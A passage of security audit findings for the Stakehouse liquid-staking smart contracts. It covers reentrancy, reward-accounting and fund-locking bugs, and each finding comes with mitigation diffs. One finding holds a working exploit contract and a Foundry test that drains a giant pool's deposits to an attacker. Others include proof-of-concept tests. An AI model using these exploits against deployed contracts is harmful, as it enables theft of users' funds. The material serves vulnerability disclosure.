Allow a user to chose to withdraw vault LP tokens by burning their giant LP tokens. 1 Giant LP == 1 vault LP      /// @param _lpTokens List of LP tokens being owned and being withdrawn from the giant pool      /// @param _amounts List of amounts of giant LP being burnt in exchange for vault LP -    function withdrawLPTokens(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external { +    function withdrawLPTokens(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external nonReentrant {          uint256 amountOfTokens = _lpTokens.length;          require(amountOfTokens > 0, "Empty arrays");          require(amountOfTokens == _amounts.length, "Inconsistent array lengths"); ```  ```diff File: contracts/liquid-staking/StakingFundsVault.sol  @@ -66,7 +66,7 @@ contract StakingFundsVault is      /// @notice Batch deposit ETH for staking against multiple BLS public keys      /// @param _blsPublicKeyOfKnots List of BLS public keys being staked      /// @param _amounts Amounts of ETH being staked for each BLS public key -    function batchDepositETHForStaking(bytes[] calldata _blsPublicKeyOfKnots, uint256[] calldata _amounts) external payable { +    function batchDepositETHForStaking(bytes[] calldata _blsPublicKeyOfKnots, uint256[] calldata _amounts) external payable nonReentrant {          uint256 numOfValidators = _blsPublicKeyOfKnots.length;          require(numOfValidators > 0, "Empty arrays");          require(numOfValidators == _amounts.length, "Inconsistent array lengths");  @@ -110,7 +110,7 @@ contract StakingFundsVault is      /// @notice Deposit ETH against a BLS public key for staking      /// @param _blsPublicKeyOfKnot BLS public key of validator registered by a node runner      /// @param _amount Amount of ETH being staked -    function depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount) public payable returns (uint256) { +    function depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount) public payable nonReentrant returns (uint256) {          require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, "BLS public key is banned or not a part of LSD network");          require(              getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,  @@ -312,7 +312,7 @@ contract StakingFundsVault is      }       /// @notice before an LP token is transferred, pay the user any unclaimed ETH rewards -    function beforeTokenTransfer(address _from, address _to, uint256) external override { +    function beforeTokenTransfer(address _from, address _to, uint256) external override nonReentrant {          address syndicate = liquidStakingNetworkManager.syndicate();          if (syndicate != address(0)) {              LPToken token = LPToken(msg.sender); ``` 
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SavETHVault.sol#L206-L207 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SavETHVault.sol#L209   # Vulnerability details  ## Impact Liquid staking manager call `function withdrawETHForStaking(address _smartWallet, uint256 _amount)` to withdraw ETH for staking. It's manager's responsibility to set the correct `_smartWallet` address. However, there is no way to guarantee this. If a typo (or any other reasons) leads to a non-zero non-existent `_smartWallet` address, this function won't be able to detect the problem, and the [ETH transfer statement](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SavETHVault.sol#L209) will always return `true`. This will result in the ETH permanently locked to a non-existent account.  ## Proof of Concept Liquid staking manager call `function withdrawETHForStaking(address _smartWallet, uint256 _amount)` with a non-zero non-existent `_smartWallet` address and some `_amount` of ETH. Function call will succeed but the ETH will be locked to the non-existent `_smartWallet` address.  ## Tools Used Manual audit.  ## Recommended Mitigation Steps The problem can be solved if we can verify the `_smartWallet` is a valid existent smartWallet before ETH transfer. The easiest solution is to verify the smartWallet has a valid owner since the smart wallet we are using is ownable. So, just add the checking owner code before [ETH transfer](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SavETHVault.sol#L209).
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L50-L64 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L180-L193   # Vulnerability details  ## Impact Function `_distributeETHRewardsToUserForToken()` is used to distribute remaining reward of user and it's called in `_onWithdraw()` of `GiantMevAndFeesPool`. but function `withdrawETH()` in `GiantPoolBase` don't call either of them and burn user giant LP token balance so if user withdraw his funds and has some remaining ETH rewards he would lose those rewards because his balance set to zero.  ## Proof of Concept This is `withdrawETH()` code in `GiantPoolBase`: ```     /// @notice Allow a user to chose to burn their LP tokens for ETH only if the requested amount is idle and available from the contract     /// @param _amount of LP tokens user is burning in exchange for same amount of ETH     function withdrawETH(uint256 _amount) external nonReentrant {         require(_amount >= MIN_STAKING_AMOUNT, "Invalid amount");         require(lpTokenETH.balanceOf(msg.sender) >= _amount, "Invalid balance");         require(idleETH >= _amount, "Come back later or withdraw less ETH");          idleETH -= _amount;          lpTokenETH.burn(msg.sender, _amount);         (bool success,) = msg.sender.call{value: _amount}("");         require(success, "Failed to transfer ETH");          emit LPBurnedForETH(msg.sender, _amount);     } ``` As you can see it burn user `lpTokenETH` balance and don't call either `_distributeETHRewardsToUserForToken()` or `_onWithdraw()`. and in function `claimRewards()` uses `lpTokenETH.balanceOf(msg.sender)` to calculate user rewards so if user balance get to `0` user won't get the remaining rewards. These are steps that this bug happens: 1. `user1` deposit `10` ETH into the giant pool and `claimed[user1][lpTokenETH]` is `20` and `accumulatedETHPerLPShare` is `2`. 2. some time passes and `accumulatedETHPerLPShare` set to `3`. 3. `user1` unclaimed rewards are `10 * 3 - 20 = 10` ETH. 4. `user1` withdraw his `10` ETH by calling `withdrawETH(10)` and contract set `lpTokenETH` balance of `user1`  to `0` and transfer `10` ETH to user. 5. now if `user1` calls `claimRewards()` he would get `0` reward as his `lpTokenETH` balance is `0`.  so users lose their unclaimed rewards by withdrawing their funds.  ## Tools Used VIM  ## Recommended Mitigation Steps user's unclaimed funds should be calculated and transferred before any actions that change user's balance.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantSavETHVaultPool.sol#L50 https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantMevAndFeesPool.sol#L44   # Vulnerability details  ## Impact An attacker can withdraw all ETH staked by users in a Giant pool. Both `GiantSavETHVaultPool` and `GiantMevAndFeesPool` are affected. ## Proof of Concept The `batchDepositETHForStaking` function in the Giant pools check whether a provided vault is authentic by validating its liquid staking manager contract and sends funds to the vault when the check passes ([GiantSavETHVaultPool.sol#L48-L58](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantSavETHVaultPool.sol#L48-L58)): ```solidity SavETHVault savETHPool = SavETHVault(_savETHVaults[i]); require(     liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),     "Invalid liquid staking manager" );  // Deposit ETH for staking of BLS key savETHPool.batchDepositETHForStaking{ value: transactionAmount }(     _blsPublicKeys[i],     _stakeAmounts[i] ); ```  An attacker can pass an exploit contract as a vault. The exploit contract will implement `liquidStakingManager` that will return a valid staking manager contract address to trick a Giant pool into sending ETH to the exploit contract: ```solidity // test/foundry/GiantPools.t.sol contract GiantPoolExploit {     address immutable owner = msg.sender;     address validStakingManager;      constructor(address validStakingManager_) {         validStakingManager = validStakingManager_;     }      function liquidStakingManager() public view returns (address) {         return validStakingManager;     }      function batchDepositETHForStaking(bytes[] calldata /*_blsPublicKeyOfKnots*/, uint256[] calldata /*_amounts*/) external payable {         payable(owner).transfer(address(this).balance);     } }  function testPoolDraining_AUDIT() public {     // Register BLS key     address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);     registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);      // Set up users and ETH     address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);      address attacker = address(0x1337);     vm.label(attacker, "attacker");     vm.deal(attacker, 1 ether);      // User deposits ETH into Giant savETH     vm.prank(savETHUser);     giantSavETHPool.depositETH{value: 24 ether}(24 ether);     assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether);     assertEq(address(giantSavETHPool).balance, 24 ether);      // Attacker deploys an exploit.     vm.startPrank(attacker);     GiantPoolExploit exploit = new GiantPoolExploit(address(manager));     vm.stopPrank();      // Attacker calls `batchDepositETHForStaking` to deposit ETH to their exploit contract.     bytes[][] memory blsKeysForVaults = new bytes[][](1);     blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);      uint256[][] memory stakeAmountsForVaults = new uint256[][](1);     stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);      giantSavETHPool.batchDepositETHForStaking(         getAddressArrayFromValues(address(exploit)),         getUint256ArrayFromValues(24 ether),         blsKeysForVaults,         stakeAmountsForVaults     );      // Vault got nothing.     assertEq(address(manager.savETHVault()).balance, 0 ether);     // Attacker has stolen user's deposit.     assertEq(attacker.balance, 25 ether); } ``` ## Tools Used Manual review ## Recommended Mitigation Steps Consider taking a list of `LiquidStakingManager` addresses instead of vault addresses: ```diff --- a/contracts/liquid-staking/GiantSavETHVaultPool.sol +++ b/contracts/liquid-staking/GiantSavETHVaultPool.sol @@ -27,12 +28,12 @@ contract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {      /// @param _blsPublicKeys For every savETH vault, the list of BLS keys of LSDN validators receiving funding      /// @param _stakeAmounts For every savETH vault, the amount of ETH each BLS key will receive in funding      function batchDepositETHForStaking( -        address[] calldata _savETHVaults, +        address[] calldata _liquidStakingManagers,          uint256[] calldata _ETHTransactionAmounts,          bytes[][] calldata _blsPublicKeys,          uint256[][] calldata _stakeAmounts      ) public { -        uint256 numOfSavETHVaults = _savETHVaults.length; +        uint256 numOfSavETHVaults = _liquidStakingManagers.length;          require(numOfSavETHVaults > 0, "Empty arrays");          require(numOfSavETHVaults == _ETHTransactionAmounts.length, "Inconsistent array lengths");          require(numOfSavETHVaults == _blsPublicKeys.length, "Inconsistent array lengths"); @@ -40,16 +41,18 @@ contract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {           // For every vault specified, supply ETH for at least 1 BLS public key of a LSDN validator          for (uint256 i; i < numOfSavETHVaults; ++i) { +            require( +                liquidStakingDerivativeFactory.isLiquidStakingManager(_liquidStakingManagers[i]), +                "Invalid liquid staking manager" +            ); +              uint256 transactionAmount = _ETHTransactionAmounts[i];               // As ETH is being deployed to a savETH pool vault, it is no longer idle              idleETH -= transactionAmount;  -            SavETHVault savETHPool = SavETHVault(_savETHVaults[i]); -            require( -                liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())), -                "Invalid liquid staking manager" -            ); +            LiquidStakingManager liquidStakingManager = LiquidStakingManager(payable(_liquidStakingManagers[i])); +            SavETHVault savETHPool = liquidStakingManager.savETHVault();               // Deposit ETH for staking of BLS key              savETHPool.batchDepositETHForStaking{ value: transactionAmount }( ```
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L52-L64   # Vulnerability details  ## Impact GiantMevAndFeesPool.withdrawETH calls lpTokenETH.burn, then GiantMevAndFeesPool.beforeTokenTransfer, followed by a call to _distributeETHRewardsToUserForToken sends ETH to the user, which allows the user to call any function in the fallback. While GiantMevAndFeesPool.withdrawETH has the nonReentrant modifier, GiantMevAndFeesPool.claimRewards does not have the nonReentrant modifier. When GiantMevAndFeesPool.claimRewards is called in GiantMevAndFeesPool.withdrawETH, the idleETH is reduced but the ETH is not yet sent to the user, which increases totalRewardsReceived and accumulatedETHPerLPShare, thus making the user receive more rewards when calling GiantMevAndFeesPool.claimRewards. ## Proof of Concept https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L52-L64 ## Tools Used None ## Recommended Mitigation Steps Change to ```diff function withdrawETH(uint256 _amount) external nonReentrant {     require(_amount >= MIN_STAKING_AMOUNT, "Invalid amount");     require(lpTokenETH.balanceOf(msg.sender) >= _amount, "Invalid balance");     require(idleETH >= _amount, "Come back later or withdraw less ETH");  -  idleETH -= _amount;      lpTokenETH.burn(msg.sender, _amount); +  idleETH -= _amount;      (bool success,) = msg.sender.call{value: _amount}("");     require(success, "Failed to transfer ETH");      emit LPBurnedForETH(msg.sender, _amount); } ```
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L195-L204 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L33-L48   # Vulnerability details  ## Impact When `depositETH()` is called in giant pool it calls `_onDepositETH()` which calls `_setClaimedToMax()` to make sure new ETH stakers are not entitled to ETH earned by but this can cause users to lose their remaining rewards when they deposits. code should first transfer user remaining rewards when deposit happens.  ## Proof of Concept This is `depositETH()` code in `GiantPoolBase`: ```     /// @notice Add ETH to the ETH LP pool at a rate of 1:1. LPs can always pull out at same rate.     function depositETH(uint256 _amount) public payable {         require(msg.value >= MIN_STAKING_AMOUNT, "Minimum not supplied");         require(msg.value == _amount, "Value equal to amount");          // The ETH capital has not yet been deployed to a liquid staking network         idleETH += msg.value;          // Mint giant LP at ratio of 1:1         lpTokenETH.mint(msg.sender, msg.value);          // If anything extra needs to be done         _onDepositETH();          emit ETHDeposited(msg.sender, msg.value);     } ``` As you can see it increase user `lpTokenETH` balance and then calls `_onDepositETH()`. This is `_onDepositETH()` and `_setClaimedToMax()` code in `GiantMevAndFeesPool` contract: ```     /// @dev On depositing on ETH set claimed to max claim so the new depositor cannot claim ETH that they have not accrued     function _onDepositETH() internal override {         _setClaimedToMax(msg.sender);     }      /// @dev Internal re-usable method for setting claimed to max for msg.sender     function _setClaimedToMax(address _user) internal {         // New ETH stakers are not entitled to ETH earned by         claimed[_user][address(lpTokenETH)] = (accumulatedETHPerLPShare * lpTokenETH.balanceOf(_user)) / PRECISION;     } ``` As you can see the code set `claimed[msg.sender][address(lpTokenETH]` to maximum value so the user wouldn't be entitled to previous rewards but if user had some remaining rewards in contract he would lose those rewards can't withdraw them. these are the steps: 1- `user1` deposit `10` ETH to giant pool and `accumulatedETHPerLPShare` value is `2` and `claimed[user1][lpTokenETH]` would be `10 * 2 = 20`. 2- some time passes and `accumulatedETHPerLPShare` set to `4` and `user1` has `10 * 4 - 20 = 20` unclaimed ETH rewards (the formula in the code: `balance * rewardPerShare - claimed`). 3- `user` deposit `5` ETH to giant pool and `accumulatedETHPerLPShare` is `4` so the code would call `_onDepositETH()` which calls `_setClaimedToMax` which sets `claimed[user1][lpTokenETH]` to `15 * 4 = 60`. 4- `user1` new remaining ETH reward would be `15 * 4 - 60 = 0`. and `user1` won't receive his rewards because when he deposits contract don't transfer remaining rewards and set claim to max so user loses his funds.  ## Tools Used VIM  ## Recommended Mitigation Steps when deposit happens contract should first send remaining rewards, then increase the user's balance and then set the user claim to max.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L133-L157 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L24-L25   # Vulnerability details  ## Impact Variable `idleETH` in giant pools is storing total amount of ETH sat idle ready for either withdrawal or depositing into a liquid staking network and whenever a deposit or withdraw happens contract adjust the value of `idleETH` of contract, but in function `bringUnusedETHBackIntoGiantPool()` which brings unused ETH from savETH vault to giant pool the value of `idleETH` don't get increased which would cause those ETH balance to not be accessible for future staking or withdrawing.  ## Proof of Concept This is `bringUnusedETHBackIntoGiantPool()` code in `GiantSavETHVaultPool()`: ```     /// @notice Any ETH that has not been utilized by a savETH vault can be brought back into the giant pool     /// @param _savETHVaults List of savETH vaults where ETH is staked     /// @param _lpTokens List of LP tokens that the giant pool holds which represents ETH in a savETH vault     /// @param _amounts Amounts of LP within the giant pool being burnt     function bringUnusedETHBackIntoGiantPool(         address[] calldata _savETHVaults,         LPToken[][] calldata _lpTokens,         uint256[][] calldata _amounts     ) external {         uint256 numOfVaults = _savETHVaults.length;         require(numOfVaults > 0, "Empty arrays");         require(numOfVaults == _lpTokens.length, "Inconsistent arrays");         require(numOfVaults == _amounts.length, "Inconsistent arrays");         for (uint256 i; i < numOfVaults; ++i) {             SavETHVault vault = SavETHVault(_savETHVaults[i]);             for (uint256 j; j < _lpTokens[i].length; ++j) {                 require(                     vault.isDETHReadyForWithdrawal(address(_lpTokens[i][j])) == false,                     "ETH is either staked or derivatives minted"                 );             }              vault.burnLPTokens(_lpTokens[i], _amounts[i]);         }     } ``` As you can see it checks that ETH is available in savETH vault and then calls to `burnLPTokens()` to burn savETH LP tokens and bring unused ETH to giant pool address, this would increase giant pool ETH balance but code don't increase the `idleETH` value so contract would lose tracking of real idle ETH balance of contract. because the vaule of `idleETH` is used when withdrawing or depositing into savETH vaults so the contract can't reuse the returned ETH. these are the steps that cause this bug to happen: 1- giant pool has 100 `idleETH`. 2- with function `batchDepositETHForStaking()` users stake 80 `ETH` and the new value of `idleETH` would be `20` and contract LP Token balance increase by 80. 3- the 80 newly staked ETH is not yet staked in `stakehouse`. 4- with function `bringUnusedETHBackIntoGiantPool()` users bring back those 80 `ETH` from Vaults to giant pool and burn giant pool LP tokens and then giant pool have 100 idle ETH but because `idleETH` value don't get increase it still would show `20`. 5- the extra 80 ETH would returned to giant pool wouldn't be accessible for withdrawing to users or depositing into Vaults because in withdrawing or depositing into Vaults the value of `idleETH` has been used to know the amount of idle ETH in giant pool and because the value doesn't show the correct amount so the extra amount of ETH wouldn't be lost.  ## Tools Used VIM  ## Recommended Mitigation Steps contract should correctly update value of `idleETH` in different actions because withdraw and deposit logics depend on it.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L62-L102   # Vulnerability details  ## Impact Function `withdrawDETH()` in `GiantSavETHVaultPool` allows a user to burn their giant LP in exchange for dETH that is ready to withdraw from a set of savETH vaults. This function make external calls to user provided addresses without checking those addresses and send increased dETH balance of contract during the call to user. user can provide malicious addresses to contract and then took the execution flow during the transaction and increase dETH balance of contract by other calls and make contract to transfer them to him.  ## Proof of Concept This is `withdrawDETH()` in `GiantSavETHVaultPool`  code: ```     /// @notice Allow a user to burn their giant LP in exchange for dETH that is ready to withdraw from a set of savETH vaults     /// @param _savETHVaults List of savETH vaults being interacted with     /// @param _lpTokens List of savETH vault LP being burnt from the giant pool in exchange for dETH     /// @param _amounts Amounts of giant LP the user owns which is burnt 1:1 with savETH vault LP and in turn that will give a share of dETH     function withdrawDETH(         address[] calldata _savETHVaults,         LPToken[][] calldata _lpTokens,         uint256[][] calldata _amounts     ) external {         uint256 numOfVaults = _savETHVaults.length;         require(numOfVaults > 0, "Empty arrays");         require(numOfVaults == _lpTokens.length, "Inconsistent arrays");         require(numOfVaults == _amounts.length, "Inconsistent arrays");          // Firstly capture current dETH balance and see how much has been deposited after the loop         uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));         for (uint256 i; i < numOfVaults; ++i) {             SavETHVault vault = SavETHVault(_savETHVaults[i]);              // Simultaneously check the status of LP tokens held by the vault and the giant LP balance of the user             for (uint256 j; j < _lpTokens[i].length; ++j) {                 LPToken token = _lpTokens[i][j];                 uint256 amount = _amounts[i][j];                  // Check the user has enough giant LP to burn and that the pool has enough savETH vault LP                 _assertUserHasEnoughGiantLPToClaimVaultLP(token, amount);                  require(vault.isDETHReadyForWithdrawal(address(token)), "dETH is not ready for withdrawal");                  // Giant LP is burned 1:1 with LPs from sub-networks                 require(lpTokenETH.balanceOf(msg.sender) >= amount, "User does not own enough LP");                  // Burn giant LP from user before sending them dETH                 lpTokenETH.burn(msg.sender, amount);                  emit LPBurnedForDETH(address(token), msg.sender, amount);             }              // Ask             vault.burnLPTokens(_lpTokens[i], _amounts[i]);         }          // Calculate how much dETH has been received from burning         dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this)) - dETHReceivedFromAllSavETHVaults;          // Send giant LP holder dETH owed         getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);     } ``` As you can see first contract save the dETH balance of contract by this line: `uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));` and then it loops through user provided vaults addresses and call those vaults to withdraw dETH and in the end it calculates `dETHReceivedFromAllSavETHVaults` and transfer those dETH to user: ` getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);`. attacker can perform these steps: 1- create a malicious contract `AttackerVault` which is copy of `SavETHVault` with modifiction. 2- call `withdrawDETH()` with Vault list `[ValidVault1, ValidVault2, AttackerVault, ValidVaul3]`. 3- contract would save the dETH balance of itself and then loops through Vaults to validate and burn LPTokens. 4- contract would reach Vault `AttackerVault` and call attacker controlled address. 5- attacker contract call other functions to increase dETH balance of contract (if it's not possible to increase dETH balance of contract by other way so there is no need to save contract initial balance of dETH before the loop and dETH balance of contract would be zero always) 6- `withdrawDETH()` would finish the loop and transfer all the increase dETH balance to attacker which includes extra amounts.  because contract don't check the provided addresses and calls them and there is no reentrancy defense mechanism there is possibility of reentrancy attack which can cause fund lose.  ## Tools Used VIM  ## Recommended Mitigation Steps check the provided addresses and also have some reentrancy defence mechanisim.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L170-L173   # Vulnerability details  ## Impact When a user transfers away GiantMevAndFeesPool tokens, the pool's claimed[] computed is left unchanged and still corresponds to what they had claimed with their old (higher) number of tokens. (See GiantMevAndFeesPool afterTokenTransfer() - no adjustment is made to claimed[] on the from side.) As a result, their claimed[] may be higher than the max amount they could possibly have claimed for their new (smaller) number of tokens. The erroneous claimed value can cause an integer overflow when the claimed[] value is subtracted, leading to inability for this user to access some functions of the GiantMevAndFeesPool - including such things as being able to transfer their tokens (overflow is triggered in a callback attempting to pay out their rewards). These overflows will occur in SyndicateRewardsProcessor's _previewAccumulatedETH() and _distributeETHRewardsToUserForToken(), the latter of which is called in a number of places. When rewards are later accumulated in the pool, the user will not be able to claim certain rewards owed to them because of the incorrect (high) claimed[] value. The excess rewards will be orphaned in the pool.  ## Proof of Concept This patch demonstrates both DOS and orphaned rewards due to the claimed[] error described above. Note that the patch includes a temp fix for the separate issue calculating claimed[] in _distributeETHRewardsToUserForToken() in order to demonstrate this is a separate issue.  Run test ``` forge test -m testTransferDOSUserOrphansFutureRewards ```  Patch ```diff diff --git a/contracts/liquid-staking/SyndicateRewardsProcessor.sol b/contracts/liquid-staking/SyndicateRewardsProcessor.sol index 81be706..ca44ae6 100644 --- a/contracts/liquid-staking/SyndicateRewardsProcessor.sol +++ b/contracts/liquid-staking/SyndicateRewardsProcessor.sol @@ -60,7 +60,7 @@ abstract contract SyndicateRewardsProcessor {              // Calculate how much ETH rewards the address is owed / due               uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];              if (due > 0) { -                claimed[_user][_token] = due; +                claimed[_user][_token] += due; // temp fix claimed calculation                    totalClaimed += due;   diff --git a/test/foundry/GiantPools.t.sol b/test/foundry/GiantPools.t.sol index 7e8bfdb..6468373 100644 --- a/test/foundry/GiantPools.t.sol +++ b/test/foundry/GiantPools.t.sol @@ -5,14 +5,18 @@ pragma solidity ^0.8.13;  import "forge-std/console.sol";  import { TestUtils } from "../utils/TestUtils.sol";   +import { MockLiquidStakingManager } from "../../contracts/testing/liquid-staking/MockLiquidStakingManager.sol";  import { GiantSavETHVaultPool } from "../../contracts/liquid-staking/GiantSavETHVaultPool.sol";  import { GiantMevAndFeesPool } from "../../contracts/liquid-staking/GiantMevAndFeesPool.sol";  import { LPToken } from "../../contracts/liquid-staking/LPToken.sol"; +import { GiantLP } from "../../contracts/liquid-staking/GiantLP.sol";  import { MockSlotRegistry } from "../../contracts/testing/stakehouse/MockSlotRegistry.sol";  import { MockSavETHVault } from "../../contracts/testing/liquid-staking/MockSavETHVault.sol";  import { MockGiantSavETHVaultPool } from "../../contracts/testing/liquid-staking/MockGiantSavETHVaultPool.sol";  import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";   +import "forge-std/console.sol"; +  contract GiantPoolTests is TestUtils {        MockGiantSavETHVaultPool public giantSavETHPool; @@ -116,4 +120,171 @@ contract GiantPoolTests is TestUtils {          assertEq(dETHToken.balanceOf(savETHUser), 24 ether);      }   +    function addNewLSM(address payable giantFeesAndMevPool, bytes memory blsPubKey) public returns (address payable) { +        manager = deployNewLiquidStakingNetwork( +            factory, +            admin, +            true, +            "LSDN" +        ); + +        savETHVault = MockSavETHVault(address(manager.savETHVault())); + +        giantSavETHPool = new MockGiantSavETHVaultPool(factory, savETHVault.dETHToken()); + +        // Set up users and ETH +        address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether); +        address savETHUser = accountThree; vm.deal(savETHUser, 24 ether); + +        // Register BLS key +        registerSingleBLSPubKey(nodeRunner, blsPubKey, accountFour); + +        // Deposit ETH into giant savETH +        vm.prank(savETHUser); +        giantSavETHPool.depositETH{value: 24 ether}(24 ether); +        assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether); +        assertEq(address(giantSavETHPool).balance, 24 ether); + +        // Deploy ETH from giant LP into savETH pool of LSDN instance +        bytes[][] memory blsKeysForVaults = new bytes[][](1); +        blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKey); + +        uint256[][] memory stakeAmountsForVaults = new uint256[][](1); +        stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether); + +        giantSavETHPool.batchDepositETHForStaking( +            getAddressArrayFromValues(address(manager.savETHVault())), +            getUint256ArrayFromValues(24 ether), +            blsKeysForVaults, +            stakeAmountsForVaults +        ); +        assertEq(address(manager.savETHVault()).balance, 24 ether); + +        assert(giantFeesAndMevPool.balance >= 4 ether); +        stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether); +        GiantMevAndFeesPool(giantFeesAndMevPool).batchDepositETHForStaking( +            getAddressArrayFromValues(address(manager.stakingFundsVault())), +            getUint256ArrayFromValues(4 ether), +            blsKeysForVaults, +            stakeAmountsForVaults +        ); + +        // Ensure we can stake and mint derivatives +        stakeAndMintDerivativesSingleKey(blsPubKey); + +        return payable(manager); +    } + +    function testTransferDOSUserOrphansFutureRewards() public { + +        address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 8 ether); +        address feesAndMevUserTwo = accountFour; + +       // Deposit ETH into giant fees and mev +        vm.startPrank(feesAndMevUserOne); +        giantFeesAndMevPool.depositETH{value: 8 ether}(8 ether); +        vm.stopPrank(); + +        MockLiquidStakingManager manager1 = MockLiquidStakingManager(addNewLSM(payable(giantFeesAndMevPool), blsPubKeyOne)); +        MockLiquidStakingManager manager2 = MockLiquidStakingManager(addNewLSM(payable(giantFeesAndMevPool), blsPubKeyTwo)); + +        bytes[][] memory blsPubKeyOneInput = new bytes[][](1); +        blsPubKeyOneInput[0] = getBytesArrayFromBytes(blsPubKeyOne); + +        bytes[][] memory blsPubKeyTwoInput = new bytes[][](1); +        blsPubKeyTwoInput[0] = getBytesArrayFromBytes(blsPubKeyTwo); + +        vm.warp(block.timestamp + 3 hours); + +        // Add 2 eth rewards to manager1's staking funds vault. +        vm.deal(address(manager1.stakingFundsVault()), 2 ether); + +        // Claim rewards into the giant pool and distribute them to user one. +        vm.startPrank(feesAndMevUserOne); +        giantFeesAndMevPool.claimRewards( +            feesAndMevUserOne, +            getAddressArrayFromValues(address(manager1.stakingFundsVault())), +            blsPubKeyOneInput); +        vm.stopPrank(); + +        // User one has received all the rewards and has no more previewed rewards. +        assertEq(feesAndMevUserOne.balance, 2 ether); +        assertEq(giantFeesAndMevPool.totalRewardsReceived(), 2 ether); +        assertEq( +            giantFeesAndMevPool.previewAccumulatedETH( +                feesAndMevUserOne, +                new address[](0), +                new LPToken[][](0)), +                0); + +        // Check the claimed[] value for user 1. It is correct. +        assertEq( +            giantFeesAndMevPool.claimed(feesAndMevUserOne, address(giantFeesAndMevPool.lpTokenETH())), +            2 ether); + +        // User one transfers half their giant tokens to user 2. +        vm.startPrank(feesAndMevUserOne); +        giantFeesAndMevPool.lpTokenETH().transfer(feesAndMevUserTwo, 4 ether); +        vm.stopPrank(); + +        // After the tokens have been transferred to user 2, user 1's claimed[] remains +        // unchanged - and is higher than the accumulated payout per share for user 1's +        // current number of shares. +        assertEq( +            giantFeesAndMevPool.claimed(feesAndMevUserOne, address(giantFeesAndMevPool.lpTokenETH())), +            2 ether); + +        // With this incorrect value of claimed[] causing a subtraction underflow, user one +        // cannot preview accumulated eth or perform any action that attempts to claim their +        // rewards such as transferring their tokens. +        vm.startPrank(feesAndMevUserOne); +        vm.expectRevert(); +        giantFeesAndMevPool.previewAccumulatedETH( +            feesAndMevUserOne, +            new address[](0), +            new LPToken[][](0)); + +        console.log("the revert expected now"); +        GiantLP token = giantFeesAndMevPool.lpTokenETH(); +        vm.expectRevert(); +        token.transfer(feesAndMevUserTwo, 1 ether); +        vm.stopPrank(); + +        // Add 1 eth rewards to manager2's staking funds vault. +        vm.deal(address(manager2.stakingFundsVault()), 2 ether); + +        // User 2 claims rewards into the giant pool and obtains its 1/2 share. +        vm.startPrank(feesAndMevUserTwo); +        giantFeesAndMevPool.claimRewards( +            feesAndMevUserTwo, +  